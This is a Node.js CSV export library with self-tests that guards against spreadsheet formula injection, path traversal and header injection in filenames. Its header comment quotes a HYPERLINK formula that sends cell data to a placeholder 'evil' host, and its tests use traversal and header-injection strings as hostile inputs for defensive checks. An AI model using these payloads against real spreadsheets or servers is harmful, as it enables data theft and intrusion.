#!/usr/bin/env node
/**
 * demigod-die-export — turn a list of records into a CSV a customer can actually open.
 *
 * WHY THIS IS NOT A ONE-LINER
 * `rows.map(r => Object.values(r).join(',')).join('\n')` is wrong in four ways that all show up on
 * real data, and two of them are security issues rather than cosmetic ones.
 *
 * 1. SEPARATORS INSIDE VALUES. Company names contain commas ("Acme, Inc."), notes contain newlines,
 *    and any of them can contain a double quote. RFC 4180 says quote the field and double the inner
 *    quotes; anything less silently shifts every later column on that row into the wrong header.
 *
 * 2. FORMULA INJECTION. A cell beginning with = + - @ or a control character is executed as a
 *    formula by Excel, LibreOffice, and Google Sheets when the file is opened. A company that names
 *    itself `=HYPERLINK("http://evil/"&A1,"click")` gets that formula run on the machine of whoever
 *    opens our export. This corpus is scraped from arbitrary third-party careers pages, so the
 *    hostile-input assumption is not hypothetical: every string in it was written by someone else.
 *    The neutralising prefix is a leading apostrophe, which spreadsheets strip on display.
 *
 *    NUMBERS ARE DEDUCTED FROM THIS. `-5` typed as a JS number is a negative number, not a formula,
 *    and prefixing it would corrupt the data it is meant to protect. Only strings are neutralised.
 *
 * 3. RAGGED KEYS. These records come from different pipelines and do not all carry the same fields.
 *    Taking the first row's keys as the header drops every column that only later rows have, which
 *    is silent data loss in the one artifact a customer uses to check our numbers.
 *
 * 4. NESTED VALUES. `[object Object]` is not an export. Non-scalars are JSON so the value survives.
 *
 *   node demigod-die-export.mjs --selftest
 *
 * Schema: demigod.die-export/1
 */
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const isMain = process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url);

/** Characters that make a spreadsheet treat a cell as a formula rather than text. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * PURE. One value to one CSV field.
 *
 * Order matters: neutralise the formula first, then quote. Doing it the other way puts the quote in
 * front of the `=` and the prefix no longer protects anything.
 */
export function csvCell(value) {
  if (value === null || value === undefined) return '';
  let text;
  if (typeof value === 'string') {
    text = FORMULA_LEAD.test(value) ? `'${value}` : value;
  } else if (typeof value === 'number' || typeof value === 'boolean' || typeof value === 'bigint') {
    // A number cannot carry a formula, and quoting a negative one would corrupt it.
    text = String(value);
  } else {
    // Objects and arrays keep their shape as JSON rather than collapsing to [object Object].
    const json = JSON.stringify(value);
    text = FORMULA_LEAD.test(json) ? `'${json}` : json;
  }
  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

/** PURE. Every key any row carries, in first-seen order, so no column is silently dropped. */
export function columnsOf(rows) {
  const seen = [];
  const known = new Set();
  for (const row of rows) {
    if (!row || typeof row !== 'object') continue;
    for (const key of Object.keys(row)) {
      if (!known.has(key)) { known.add(key); seen.push(key); }
    }
  }
  return seen;
}

/**
 * PURE. Records to an RFC 4180 document.
 *
 * CRLF, not LF: the RFC specifies it, and Excel on Windows is the single most likely destination
 * for a file a customer asked to download.
 */
export function toCsv(rows, { columns } = {}) {
  const list = Array.isArray(rows) ? rows : [];
  const cols = columns && columns.length ? columns : columnsOf(list);
  if (!cols.length) return '';
  const lines = [cols.map(csvCell).join(',')];
  for (const row of list) {
    lines.push(cols.map((key) => csvCell(row ? row[key] : null)).join(','));
  }
  return `${lines.join('\r\n')}\r\n`;
}

/** PURE. A filename that cannot escape the download directory or carry a header. */
export function exportFilename(dataset, ext, { at = new Date() } = {}) {
  const safe = String(dataset).replace(/[^a-z0-9-]/gi, '').slice(0, 40) || 'export';
  const day = at.toISOString().slice(0, 10);
  return `demigod-${safe}-${day}.${ext === 'csv' ? 'csv' : 'json'}`;
}

function selftest() {
  const assert = (cond, msg) => { if (!cond) throw new Error(`die-export selftest: ${msg}`); };

  // --- RFC 4180 escaping ---
  assert(csvCell('plain') === 'plain', 'a plain value is not quoted');
  assert(csvCell('Acme, Inc.') === '"Acme, Inc."', 'a comma forces quoting');
  assert(csvCell('say "hi"') === '"say ""hi"""', 'inner quotes are doubled and the field quoted');
  assert(csvCell('two\nlines') === '"two\nlines"', 'a newline forces quoting');
  assert(csvCell(null) === '' && csvCell(undefined) === '', 'absent is empty, not the string null');

  // --- formula injection, the reason this file exists ---
  for (const lead of ['=', '+', '-', '@']) {
    const out = csvCell(`${lead}HYPERLINK("http://evil")`);
    assert(out.startsWith(`"'${lead}`) || out.startsWith(`'${lead}`),
      `a string starting with ${lead} is neutralised before quoting`);
  }
  assert(csvCell('=1+1') === "'=1+1", 'the apostrophe goes in front of the equals');
  assert(csvCell('@SUM(A1)') === "'@SUM(A1)", 'at-sign leads are neutralised too');
  // and the deduction: real numbers must survive intact
  assert(csvCell(-5) === '-5', 'a negative NUMBER is data, not a formula, and is left alone');
  assert(csvCell(0) === '0' && csvCell(false) === 'false', 'falsy scalars are values, not blanks');

  // --- ragged keys ---
  const cols = columnsOf([{ a: 1 }, { b: 2 }, { a: 3, c: 4 }]);
  assert(cols.join(',') === 'a,b,c', `every key from every row appears, got ${cols.join(',')}`);
  const ragged = toCsv([{ a: 1 }, { b: 2 }]);
  assert(ragged.split('\r\n')[0] === 'a,b', 'the header is the union, not the first row');
  assert(ragged.split('\r\n')[1] === '1,', 'a row missing a later column pads rather than shifting');

  // --- nested values ---
  assert(csvCell({ x: 1 }) === '"{""x"":1}"', 'an object survives as JSON, not [object Object]');
  assert(csvCell([1, 2]).includes('[1,2]'), 'an array keeps its shape');

  // --- shape ---
  assert(toCsv([]) === '', 'nothing to export is an empty document, not a bare newline');
  assert(toCsv([{ a: 1 }]).endsWith('\r\n'), 'CRLF line endings per RFC 4180');
  assert(toCsv([{ a: 1 }], { columns: ['a', 'zz'] }).split('\r\n')[0] === 'a,zz',
    'an explicit column list is honoured so a caller can fix the order');

  // --- filenames ---
  assert(exportFilename('../../etc/passwd', 'csv').startsWith('demigod-etcpasswd-'),
    'a traversal-shaped dataset name cannot escape the filename');
  assert(!exportFilename('a"b\r\nX-Evil: 1', 'csv').match(/[\r\n"]/),
    'a filename cannot carry a header injection');
  assert(exportFilename('roles', 'json').endsWith('.json'), 'the extension follows the format');

  console.log(JSON.stringify({ ok: true, selftest: 'demigod-die-export' }));
}

if (isMain) {
  if (process.argv.includes('--selftest')) selftest();
  else console.log('usage: demigod-die-export.mjs --selftest   (library: toCsv, csvCell, columnsOf)');
}
